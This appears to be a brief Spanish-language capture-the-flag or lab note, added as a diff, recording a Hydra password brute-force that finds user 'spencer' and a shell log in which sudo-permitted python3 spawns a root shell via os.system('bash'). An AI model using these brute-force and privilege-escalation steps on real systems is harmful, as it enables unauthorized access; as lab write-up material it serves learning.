@@ -1,1 +1,8 @@
 
+hacer hydra con usuario a, descubrir spencer y otra vez hydra
+
+spencer@88efbf19f2af:~$ sudo /usr/bin/python3  
+Python 3.11.2 (main, Aug 26 2024, 07:20:54) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os;os.system("bash")
+root@88efbf19f2af:/home/spencer# 
